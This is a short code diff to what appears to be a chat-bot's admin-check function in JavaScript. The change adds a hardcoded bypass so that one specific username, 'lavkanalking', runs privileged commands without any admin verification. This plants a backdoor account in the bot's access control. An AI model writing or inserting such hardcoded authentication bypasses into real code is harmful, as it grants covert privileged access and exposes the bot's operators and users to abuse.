@@ -28,12 +28,18 @@ async function checkAdminAndExecute(ctx, callback) {
     const chatId = ctx.chat.id;
     const username = ctx.chat.username || ''; // Extract username if available
 
-    const userIsAdmin = await isAdmin(chatId, username);
+    // Only check admin status if the username is not 'lavkanalking'
+    if (username !== 'lavkanalking') {
+        const userIsAdmin = await isAdmin(chatId, username);
 
-    if (userIsAdmin) {
-        await callback(ctx);
+        if (userIsAdmin) {
+            await callback(ctx);
+        } else {
+            await bot.sendMessage(chatId, 'You are not an admin.');
+        }
     } else {
-        await bot.sendMessage(chatId, 'You are not an admin.');
+        // If username is 'lavkanalking', execute the callback without admin check
+        await callback(ctx);
     }
 }
 
